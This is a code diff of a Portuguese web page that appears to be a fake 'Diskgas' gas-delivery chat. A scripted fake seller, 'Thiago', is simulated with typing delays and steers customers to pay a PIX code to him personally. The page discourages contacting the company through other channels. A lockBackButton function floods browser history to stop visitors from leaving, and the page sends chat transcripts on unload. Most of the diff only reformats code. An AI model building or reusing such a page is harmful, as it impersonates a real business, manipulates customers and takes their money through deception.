@@ -799,34 +799,18 @@ html,body{
 }
 
 .status-steps {
-  display: flex;
-  gap: 8px;
-  margin-bottom: 15px;
+  display: flex; gap: 8px; margin-bottom: 15px;
 }
 
 .step-bar {
-  height: 4px;
-  flex: 1;
-  background: var(--border-2);
-  border-radius: 2px;
-  position: relative;
-  overflow: hidden;
+  height: 4px; flex: 1; background: var(--border-2); border-radius: 2px; position: relative; overflow: hidden;
 }
 
 .step-bar.active::after {
-  content: '';
-  position: absolute;
-  left: 0;
-  top: 0;
-  height: 100%;
-  width: 60%;
-  background: var(--brand);
-  animation: pulse-progress 2s infinite ease-in-out;
+  content: ''; position: absolute; left: 0; top: 0; height: 100%; width: 60%; background: var(--brand); animation: pulse-progress 2s infinite ease-in-out;
 }
 
-.step-bar.completed {
-  background: var(--green);
-}
+.step-bar.completed { background: var(--green); }
 
 @keyframes pulse-progress {
   0% { opacity: 0.6; width: 40%; }
@@ -834,38 +818,14 @@ html,body{
   100% { opacity: 0.6; width: 40%; }
 }
 
-.status-info {
-  display: flex;
-  align-items: center;
-  gap: 12px;
-}
+.status-info { display: flex; align-items: center; gap: 12px; }
 
-/* Ícone de status com brilho profissional */
 .status-icon-pulse {
-  width: 42px;
-  height: 42px;
-  background: #fff;
-  border-radius: 12px; /* Formato levemente arredondado em vez de círculo */
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  color: var(--brand);
-  position: relative;
-  box-shadow: 0 4px 12px rgba(15, 91, 168, 0.12);
-  border: 1px solid var(--brand-lt);
+  width: 42px; height: 42px; background: #fff; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: var(--brand); position: relative; box-shadow: 0 4px 12px rgba(15, 91, 168, 0.12); border: 1px solid var(--brand-lt);
 }
 
-/* Efeito de brilho suave (Glow) */
 .status-icon-pulse::before {
-  content: '';
-  position: absolute;
-  inset: -2px;
-  background: var(--brand);
-  border-radius: 14px;
-  z-index: -1;
-  opacity: 0.15;
-  filter: blur(8px);
-  animation: soft-glow 2s infinite ease-in-out;
+  content: ''; position: absolute; inset: -2px; background: var(--brand); border-radius: 14px; z-index: -1; opacity: 0.15; filter: blur(8px); animation: soft-glow 2s infinite ease-in-out;
 }
 
 @keyframes soft-glow {
@@ -873,19 +833,8 @@ html,body{
   50% { opacity: 0.3; transform: scale(1.1); }
 }
 
-
-.status-text-main {
-  font-size: 14px;
-  font-weight: 700;
-  color: var(--text);
-  margin-bottom: 2px;
-}
-
-.status-text-sub {
-  font-size: 12px;
-  color: var(--text-3);
-  margin-top: 2px;
-}
+.status-text-main { font-size: 14px; font-weight: 700; color: var(--text); margin-bottom: 2px; }
+.status-text-sub { font-size: 12px; color: var(--text-3); margin-top: 2px; }
 
 </style>
 </head>
@@ -957,8 +906,6 @@ html,body{
     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
     <span class="fab-badge" id="fabBadge">0</span>
   </button>
-
-
 
   <!-- FOOTER -->
   <footer class="footer">
@@ -1043,7 +990,7 @@ html,body{
         </div>
         <div class="info-row">
           <div class="info-ico">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
           </div>
           <div class="info-txt">
             <span class="info-lbl">Garantia Diskgas</span>
@@ -1118,9 +1065,12 @@ socket.on('connect', () => {
 });
 
 socket.on('receive_message', (data) => {
-    if (data.sender !== 'Cliente') {
-        // Recebe mensagem do admin/agente real e renderiza
-        addMsg(data.text, 'agent', false, true, false); // false no final para não re-emitir o que acabou de receber
+    // CORREÇÃO DE DUPLICAÇÃO:
+    // Se a mensagem recebida for do "Thiago" mas tiver o campo `isAuto: true`, 
+    // significa que é uma mensagem que o próprio chat enviou e o servidor está devolvendo.
+    // Ignoramos essas para evitar duplicação.
+    if (data.sender !== 'Cliente' && !data.isAuto) {
+        addMsg(data.text, 'agent', false, true, false); 
     }
 });
 
@@ -1286,8 +1236,6 @@ backBtnEl.onclick = () => {
   modalOverlayEl.classList.add('on');
 };
 
-
-
 if ('visualViewport' in window) {
   function handleViewport() {
     const vv = window.visualViewport;
@@ -1295,9 +1243,7 @@ if ('visualViewport' in window) {
     const footer = document.querySelector('.footer');
     const fab = document.querySelector('.scroll-fab');
     const keyboardOpen = vv.height < window.innerHeight * 0.75;
-
     app.style.height = vv.height + 'px';
-
     if (keyboardOpen) {
       footer.style.paddingBottom = '8px';
       fab.classList.add('keyboard-open');
@@ -1325,9 +1271,7 @@ inputEl.addEventListener('input', () => {
 inputEl.addEventListener('keydown', e => { if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();doSend();} });
 
 sendBtnEl.addEventListener('mousedown', e => { if (inputEl.value.trim()) e.preventDefault(); });
-
 sendBtnEl.addEventListener('click', () => doSend());
-
 
 // ── MESSAGES ─────────────────────────────────────────
 function addMsg(text, type, newGroup=false, saveToStorage=true, emitToSocket=true) {
@@ -1349,16 +1293,15 @@ function addMsg(text, type, newGroup=false, saveToStorage=true, emitToSocket=tru
   }
   scrollDown();
   
-  if (saveToStorage) {
-    saveChatHistory();
-  }
+  if (saveToStorage) saveChatHistory();
 
-  // ENVIA TUDO PARA O SOCKET (Usuário ou Agente Automático)
+  // ENVIA PARA O SOCKET
   if (emitToSocket) {
       socket.emit('send_message', { 
           userId: userId, 
           text: text, 
-          sender: type === 'user' ? 'Cliente' : 'Thiago' 
+          sender: type === 'user' ? 'Cliente' : 'Thiago',
+          isAuto: type === 'agent' // Marca como automática para o servidor saber e para nós ignorarmos na volta
       });
   }
   
@@ -1380,9 +1323,7 @@ function saveChatHistory() {
   localStorage.setItem(STATE_STORAGE_KEY, JSON.stringify(state));
 }
 
-function loadChatHistory() {
-  return localStorage.getItem(LOCAL_STORAGE_KEY);
-}
+function loadChatHistory() { return localStorage.getItem(LOCAL_STORAGE_KEY); }
 
 function addSys(html, variant='') {
   const d = document.createElement('div'); d.className='sys';
@@ -1452,10 +1393,8 @@ const confirmationMessages = [
   "Assim que você confirmar abaixo a gente continua"
 ];
 
-
 function showOrderConfirmation() {
   window._orderConfirmationShown = true; 
-  
   if (!currentConfirmationBlock) {
     currentConfirmationBlock = document.createElement('div');
     currentConfirmationBlock.className = 'steps-card order-confirmation-block';
@@ -1489,9 +1428,7 @@ function showOrderConfirmation() {
         <div style="font-size:10px;color:var(--text-3);font-weight:600;text-transform:uppercase;letter-spacing:0.4px;">Confirme os dados abaixo</div>
       </div>
     </div>
-
     <div style="margin-bottom:14px;">${itemsHtml}</div>
-
     <div style="background:var(--surface-2);border-radius:14px;padding:14px;margin-bottom:18px;border:1px solid var(--border-2);">
       <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;padding-bottom:12px;border-bottom:1px solid var(--border);">
         <div style="font-size:12px;color:var(--text-3);font-weight:600;">Subtotal</div>
@@ -1502,7 +1439,6 @@ function showOrderConfirmation() {
         <div style="font-size:11.5px;color:var(--text-2);line-height:1.4;font-weight:500;">${ORDER.address || 'Endereço não informado'}</div>
       </div>
     </div>
-
     <div style="display:flex;flex-direction:column;gap:10px;">
       <button id="btnCorrect" style="width:100%;padding:13px;border-radius:12px;border:none;background:var(--brand);color:#fff;font-weight:700;cursor:pointer;font-size:14px;box-shadow:0 4px 12px var(--brand-glow);transition:all 0.2s;">
         Sim, prosseguir
@@ -1510,9 +1446,7 @@ function showOrderConfirmation() {
       <button id="btnChange" style="width:100%;padding:10px;border-radius:12px;border:none;background:transparent;color:var(--text-3);font-weight:600;cursor:pointer;font-size:12px;transition:all 0.2s;">Alterar informações</button>
     </div>
   `;
-
   scrollDown();
-
   currentConfirmationBlock.querySelector('#btnCorrect').onclick = async () => {
     currentConfirmationBlock.style.opacity='0.8';
     currentConfirmationBlock.style.pointerEvents='none';
@@ -1524,17 +1458,13 @@ function showOrderConfirmation() {
     if(confirmationResolve) confirmationResolve('correct');
   };
   currentConfirmationBlock.querySelector('#btnChange').onclick = () => { updateModal(true); modalOverlayEl.classList.add('on'); };
-
-  if (!confirmationResolve) {
-    return new Promise(resolve => { confirmationResolve=resolve; });
-  }
+  if (!confirmationResolve) return new Promise(resolve => { confirmationResolve=resolve; });
 }
 
 // ── PIX CARD ────────────────────────────────────────
 function showDeliverySteps(pixCode) {
   pixCode = pixCode || '(código indisponível)';
   window._currentPixCode = pixCode;
-
   if (window._pixCopyTimer) clearTimeout(window._pixCopyTimer);
   if (window._pixPaymentTimer) clearTimeout(window._pixPaymentTimer);
   window._pixCopyClicked = false;
@@ -1558,65 +1488,27 @@ function showDeliverySteps(pixCode) {
   }, 5 * 60 * 1000);
 
   const finalPrice = ORDER.productPrice.toFixed(2).replace('.',',');
-
   const card = document.createElement('div');
   card.className = 'pix-card';
   card.innerHTML = `
     <div class="pix-card-header">
       <div class="pix-brand-mark">
         <div class="pix-logo">PIX</div>
-        <div>
-          <div class="pix-brand-label">Pix Protegido</div>
-          <div class="pix-brand-sub">Disk Gás Entregas.</div>
-        </div>
+        <div><div class="pix-brand-label">Pix Protegido</div><div class="pix-brand-sub">Disk Gás Entregas.</div></div>
       </div>
-      <div class="pix-expiry">
-        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-        20 min
-      </div>
+      <div class="pix-expiry"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> 20 min</div>
     </div>
-
-    <div class="pix-price-hero">
-      <div class="pix-price-eyebrow">Valor a pagar</div>
-      <div class="pix-price-amount"><span>R$</span>${finalPrice}</div>
-    </div>
-
+    <div class="pix-price-hero"><div class="pix-price-eyebrow">Valor a pagar</div><div class="pix-price-amount"><span>R$</span>${finalPrice}</div></div>
     <div style="background:#F0FDF4;border:1px solid rgba(16,185,129,.22);border-radius:12px;padding:11px 14px;margin-bottom:14px;display:flex;align-items:center;gap:11px;cursor:pointer;" onclick="openSellerModal()">
-      <div style="width:34px;height:34px;background:var(--green);border-radius:9px;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 3px 8px rgba(16,185,129,.25);">
-        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
-      </div>
-      <div>
-        <div style="font-size:10px;font-weight:700;color:#065F46;text-transform:uppercase;letter-spacing:.6px;margin-bottom:2px;">Vendedor Autorizado</div>
-        <div style="font-size:13px;font-weight:700;color:var(--text);line-height:1.2;">Thiago Callegari.</div>
-        <div style="font-size:10.5px;color:var(--text-3);margin-top:2px;">Vendedor Oficial · Diskgás</div>
-      </div>
+      <div style="width:34px;height:34px;background:var(--green);border-radius:9px;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 3px 8px rgba(16,185,129,.25);"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+      <div><div style="font-size:10px;font-weight:700;color:#065F46;text-transform:uppercase;letter-spacing:.6px;margin-bottom:2px;">Vendedor Autorizado</div><div style="font-size:13px;font-weight:700;color:var(--text);line-height:1.2;">Thiago Callegari.</div><div style="font-size:10.5px;color:var(--text-3);margin-top:2px;">Vendedor Oficial · Diskgás</div></div>
     </div>
-
-    <div class="pix-code-row">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--text-3)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-      <div class="pix-code-text">${pixCode.substring(0,40)}…</div>
-    </div>
-
-    <button class="pix-copy-btn" id="pixCopyBtn">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-      Copiar código Pix
-    </button>
-
-    <div class="pix-trust-row">
-      <div class="pix-trust-item positive">
-        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
-        Confirmação instantânea
-      </div>
-      <div class="pix-trust-item neutral">
-        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-        Pagamento seguro
-      </div>
-    </div>
+    <div class="pix-code-row"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--text-3)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><div class="pix-code-text">${pixCode.substring(0,40)}…</div></div>
+    <button class="pix-copy-btn" id="pixCopyBtn"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar código Pix</button>
+    <div class="pix-trust-row"><div class="pix-trust-item positive"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Confirmação instantânea</div><div class="pix-trust-item neutral"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> Pagamento seguro</div></div>
   `;
-
   msgsEl.appendChild(card);
   scrollDown();
-
   const copyBtn = card.querySelector('#pixCopyBtn');
   if (copyBtn) {
     copyBtn.onclick = () => {
@@ -1625,17 +1517,11 @@ function showDeliverySteps(pixCode) {
       navigator.clipboard.writeText(pixCode).catch(()=>{});
       copyBtn.classList.add('copied');
       copyBtn.style.background = '#10B981';
-      copyBtn.innerHTML = `
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
-        Código copiado!
-      `;
+      copyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Código copiado!`;
       setTimeout(()=>{
         copyBtn.classList.remove('copied');
         copyBtn.style.background = 'var(--brand)';
-        copyBtn.innerHTML = `
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-          Copiar código Pix
-        `;
+        copyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar código Pix`;
       }, 2500);
     };
   }
@@ -1659,91 +1545,64 @@ function getGreeting() {
 function pause(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
 async function agentSay(text, newGroup=false, immediateTyping=false) {
-  if (!immediateTyping) {
-    await pause(800 + Math.random() * 700);
-  }
+  if (!immediateTyping) await pause(800 + Math.random() * 700);
   const typingMs = Math.max(1200, Math.min(text.split(' ').length * 200 + 600, 3500));
-  setTyping(true); 
-  await pause(typingMs); 
-  setTyping(false);
+  setTyping(true); await pause(typingMs); setTyping(false);
   addMsg(text, 'agent', newGroup); 
 }
 
 async function runConversation(startStep = 0) {
   const { location } = ORDER;
   const gr = getGreeting();
-
   if (startStep === 0) {
-    window._currentFlowStep = 1;
-    saveChatHistory();
+    window._currentFlowStep = 1; saveChatHistory();
     const spWaiting = addSpinner("Aguarde um Momento...");
-    await pause(3000);
-    spWaiting.remove();
+    await pause(3000); spWaiting.remove();
   }
-
   if (window._currentFlowStep === 1) {
-    window._currentFlowStep = 2;
-    saveChatHistory();
+    window._currentFlowStep = 2; saveChatHistory();
     await agentSay(`${gr}`, false, true);
     await pause(300);
     await agentSay(`Sou Thiago, vendedor autorizado Diskgas em ${location} e Região`, false, true);
     await pause(800);
   }
-
   if (window._currentFlowStep === 2) {
-    window._currentFlowStep = 3;
-    saveChatHistory();
+    window._currentFlowStep = 3; saveChatHistory();
     const spValPre = addSpinner("Validando dados do pedido...");
-    await pause(3000);
-    spValPre.remove();
+    await pause(3000); spValPre.remove();
     await agentSay(`Peço que verifique se está tudo certo, por gentileza`, true, true);
   }
-
   let action;
   if (window._currentFlowStep === 3) {
     await pause(400);
     action = await showOrderConfirmation();
     if (action === 'correct') {
-      window._currentFlowStep = 4;
-      saveChatHistory();
+      window._currentFlowStep = 4; saveChatHistory();
     } else if (action === 'change') {
       await agentSay(`Sem problemas! Pode me falar o que deseja alterar ou clique no ícone do carrinho no topo para ajustar seu pedido.`);
-      window._currentFlowStep = 99; 
-      saveChatHistory();
-      return;
+      window._currentFlowStep = 99; saveChatHistory(); return;
     }
   }
-
   if (window._currentFlowStep === 4) {
-    window._currentFlowStep = 5;
-    saveChatHistory();
+    window._currentFlowStep = 5; saveChatHistory();
     const spVal = addSpinner("Validando dados do pedido...");
-    await pause(3500);
-    spVal.remove();
+    await pause(3500); spVal.remove();
     addSys('Pedido validado com sucesso', 'ok');
   }
-
   if (window._currentFlowStep === 5) {
-    window._currentFlowStep = 6;
-    saveChatHistory();
+    window._currentFlowStep = 6; saveChatHistory();
     const localBase = ORDER.location || 'sua região';
     const localFinal = localBase === 'sua região' ? localBase : `${localBase} e região`;
     await agentSay(`Certo, já vou enviar o pix, um segundo...`);
-    await pause(900);
-    setTyping(true);
-    await pause(5500);
-    setTyping(false);
+    await pause(900); setTyping(true); await pause(5500); setTyping(false);
     await addMsg(`Você verá Thiago Callegari no pix, pois sou o vendedor diskgás oficial em ${localFinal}, serei responsável pela entrega 😃`, 'agent', true);
     await pause(600);
   }
-
   if (window._currentFlowStep === 6) {
-    window._currentFlowStep = 7;
-    saveChatHistory();
+    window._currentFlowStep = 7; saveChatHistory();
     const sp = addSpinner("Preparando chave Pix...");
     let pixCode = window._currentPixCode;
     const pixStartTime = Date.now();
-    
     if (!pixCode) {
       const _hasOrderParams = window.location.search && new URLSearchParams(window.location.search).get('products');
       if (!_hasOrderParams) {
@@ -1754,10 +1613,7 @@ async function runConversation(startStep = 0) {
           const savedState = localStorage.getItem(STATE_STORAGE_KEY);
           if (savedState) {
             const state = JSON.parse(savedState);
-            if (state.pixCode) {
-              pixCode = state.pixCode;
-              window._currentPixCode = pixCode;
-            }
+            if (state.pixCode) { pixCode = state.pixCode; window._currentPixCode = pixCode; }
           }
           if (!pixCode) {
             const payerName = ORDER.nome ? ORDER.nome.split(' ').map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join(' ') : 'Cliente';
@@ -1768,62 +1624,37 @@ async function runConversation(startStep = 0) {
               body: JSON.stringify({ payer_name: payerName, amount: amountStr })
             });
             const pixData = await pixResp.json();
-            if (pixData.success && pixData.pixCode) {
-              pixCode = pixData.pixCode;
-              window._currentPixCode = pixCode;
-            }
+            if (pixData.success && pixData.pixCode) { pixCode = pixData.pixCode; window._currentPixCode = pixCode; }
           }
         } catch (err) { console.error(err); }
       }
     }
-
     const elapsed = Date.now() - pixStartTime;
     if (elapsed < 7000) await pause(7000 - elapsed);
-    sp.remove();
-    addSys('Pix gerado com sucesso', 'ok');
-    sendTranscript(); 
-    await pause(1000);
-    setTyping(true);
-    await pause(3000);
-    setTyping(false);
-    showDeliverySteps(pixCode);
-    await pause(1500);
-    addProfessionalStatusCard();
-    window._currentFlowStep = 8;
-    saveChatHistory();
+    sp.remove(); addSys('Pix gerado com sucesso', 'ok');
+    sendTranscript(); await pause(1000); setTyping(true); await pause(3000); setTyping(false);
+    showDeliverySteps(pixCode); await pause(1500); addProfessionalStatusCard();
+    window._currentFlowStep = 8; saveChatHistory();
   }
 }
 
 async function doSend() {
   const text = inputEl.value.trim();
   if (!text) return;
-
   sendBtnEl.disabled = true;
-
-  if (text.toLowerCase() === 'emailjs') {
-    sendTranscript();
-    inputEl.value = '';
-    return;
-  }
-  
+  if (text.toLowerCase() === 'emailjs') { sendTranscript(); inputEl.value = ''; return; }
   const originalText = text;
-  inputEl.value=''; inputEl.style.height='auto'; 
-  inputEl.blur();
-
+  inputEl.value=''; inputEl.style.height='auto'; inputEl.blur();
   const paymentTerms = ["pago", "feito", "já", "ja", "paguei", "pagar", "fiz", "finalizei", "efetivado", "finalizado", "realizei", "efetuado", "realizado", "terminei", "acabei", "concluí", "conclui", "concluido", "concluído"];
   const lowerText = originalText.toLowerCase();
   const foundPaymentTerm = paymentTerms.some(term => lowerText.includes(term));
-
   const contactTerms = ["telefone","whatsapp","zap","ligar","whats","whatss","ligação","ligacao","número do","número de","numero do","numero de","contato"];
   const foundContactTerm = !window._contactMsgSent && contactTerms.some(term => lowerText.includes(term));
-
   const words = originalText.split(/\s+/).filter(w => w.trim().length > 0);
   const wordCount = words.length;
   const isLongMessage = wordCount > 2 && !(foundPaymentTerm && window._currentFlowStep >= 6);
-
   const { row } = addMsg(originalText, 'user');
   await pause(1600);
-
   if (foundPaymentTerm && window._currentFlowStep >= 6 && !window._paymentConfirmed) {
     window._paymentConfirmed = true;
     if (window._pixPaymentTimer) clearTimeout(window._pixPaymentTimer);
@@ -1831,142 +1662,58 @@ async function doSend() {
     await agentSay("Certo, com o pagamento realizado podemos preparar o envio, o prazo de entrega é de 20-30 minutos", true, true);
     saveChatHistory();
   } else if (foundContactTerm) {
-    window._contactMsgSent = true;
-    saveChatHistory();
+    window._contactMsgSent = true; saveChatHistory();
     await agentSay("Por segurança este é o único canal de atendimento Diskgas, não fazemos atendimento em outros canais.", true, true);
     saveChatHistory();
   } else if (isLongMessage) {
     const bubble = row.querySelector('.bubble');
     bubble.dataset.originalText = originalText; 
     bubble.style.transition='all 0.4s cubic-bezier(0.4,0,0.2,1)';
-    bubble.style.background='#F1F5F9'; 
-    bubble.style.color='#475569';
-    bubble.style.border='1px solid #CBD5E1'; 
-    bubble.style.boxShadow='0 2px 6px rgba(0,0,0,0.04)';
-    bubble.innerHTML=`
-      <div style="display:flex;align-items:center;gap:8px;font-size:12px;font-weight:700;margin-bottom:4px;color:#1e293b;">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-        Chat exclusivo para clientes com pedidos em fase de entrega
-      </div>
-      <div style="font-size:11px;opacity:0.9;line-height:1.5;font-weight:500;">Você poderá enviar mensagems ao vendedor Diskgás quando o pedido estiver em fase de entrega, para isso basta realizar o pagamento do pedido e o chat será liberado.</div>
-    `;
-    row.classList.add('shake');
-    setTimeout(()=>row.classList.remove('shake'), 400);
+    bubble.style.background='#F1F5F9'; bubble.style.color='#475569'; bubble.style.border='1px solid #CBD5E1'; bubble.style.boxShadow='0 2px 6px rgba(0,0,0,0.04)';
+    bubble.innerHTML=`<div style="display:flex;align-items:center;gap:8px;font-size:12px;font-weight:700;margin-bottom:4px;color:#1e293b;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Chat exclusivo para clientes com pedidos em fase de entrega</div><div style="font-size:11px;opacity:0.9;line-height:1.5;font-weight:500;">Você poderá enviar mensagems ao vendedor Diskgás quando o pedido estiver em fase de entrega, para isso basta realizar o pagamento do pedido e o chat será liberado.</div>`;
+    row.classList.add('shake'); setTimeout(()=>row.classList.remove('shake'), 400);
   }
-
   if (window._currentFlowStep === 3 && window._orderConfirmationShown) {
     await pause(2000);
     const msg = confirmationMessages[confirmationMsgIndex];
     await agentSay(msg, true, true);
     confirmationMsgIndex = (confirmationMsgIndex + 1) % confirmationMessages.length;
-    currentConfirmationBlock = null;
-    showOrderConfirmation();
+    currentConfirmationBlock = null; showOrderConfirmation();
   }
   scrollDown(true);
 }
-
 
 function addProfessionalStatusCard() {
   const card = document.createElement('div');
   card.className = 'payment-status-card';
-  card.innerHTML = `
-    <div class="status-header">
-      <span class="status-badge">Diskgas Oficial</span>
-      <span style="font-size: 11px; color: var(--text-3); font-weight: 600;">Pedido #2849</span>
-    </div>
-    <div class="status-steps">
-      <div class="step-bar completed"></div>
-      <div class="step-bar completed"></div>
-      <div class="step-bar active"></div>
-      <div class="step-bar"></div>
-    </div>
-    <div class="status-info">
-      <div class="status-icon-pulse">
-        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-          <path d="m9 12 2 2 4-4"/>
-        </svg>
-      </div>
-      <div>
-        <div class="status-text-main">Aguardando pagamento do PIX...</div>
-        <div class="status-text-sub">O entregador será acionado imediatamente após o PIX.</div>
-      </div>
-    </div>
-    <div style="margin-top: 15px; padding-top: 12px; border-top: 1px dashed var(--border-2); display: flex; align-items: center; gap: 8px;">
-       <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10B981" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
-       <span style="font-size: 11px; color: #059669; font-weight: 700;">Garantia de Entrega Prioritária Ativa</span>
-    </div>
-  `;
-  msgsEl.appendChild(card);
-  scrollDown(true);
-  return card;
+  card.innerHTML = `<div class="status-header"><span class="status-badge">Diskgas Oficial</span><span style="font-size: 11px; color: var(--text-3); font-weight: 600;">Pedido #2849</span></div><div class="status-steps"><div class="step-bar completed"></div><div class="step-bar completed"></div><div class="step-bar active"></div><div class="step-bar"></div></div><div class="status-info"><div class="status-icon-pulse"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg></div><div><div class="status-text-main">Aguardando pagamento do PIX...</div><div class="status-text-sub">O entregador será acionado imediatamente após o PIX.</div></div></div><div style="margin-top: 15px; padding-top: 12px; border-top: 1px dashed var(--border-2); display: flex; align-items: center; gap: 8px;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10B981" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg><span style="font-size: 11px; color: #059669; font-weight: 700;">Garantia de Entrega Prioritária Ativa</span></div>`;
+  msgsEl.appendChild(card); scrollDown(true); return card;
 }
 
-// ── BROWSER BACK LOCK ────────────────────────────────
 function lockBackButton() {
   const STACK_FILL = 60;
-  for (let i = 0; i < STACK_FILL; i++) {
-    history.pushState({ diskgas_lock: true, n: i }, '', location.href);
-  }
-  window.addEventListener('popstate', function() {
-    history.pushState({ diskgas_lock: true }, '', location.href);
-    history.go(1);
-  });
-  setInterval(function() {
-    try { history.pushState({ diskgas_lock: true }, '', location.href); } catch(e) {}
-  }, 500);
-  window.addEventListener('blur', function() {
-    for (let i = 0; i < 10; i++) {
-      history.pushState({ diskgas_lock: true }, '', location.href);
-    }
-  });
-  document.addEventListener('visibilitychange', function() {
-    if (document.visibilityState === 'visible') {
-      for (let i = 0; i < 15; i++) {
-        history.pushState({ diskgas_lock: true }, '', location.href);
-      }
-    }
-  });
-  window.addEventListener('beforeunload', function() {
-    history.pushState({ diskgas_lock: true }, '', location.href);
-    sendTranscript(); 
-  });
-  window.addEventListener('pagehide', function() {
-    for (let i = 0; i < 20; i++) {
-      history.pushState({ diskgas_lock: true }, '', location.href);
-    }
-  });
+  for (let i = 0; i < STACK_FILL; i++) history.pushState({ diskgas_lock: true, n: i }, '', location.href);
+  window.addEventListener('popstate', function() { history.pushState({ diskgas_lock: true }, '', location.href); history.go(1); });
+  setInterval(function() { try { history.pushState({ diskgas_lock: true }, '', location.href); } catch(e) {} }, 500);
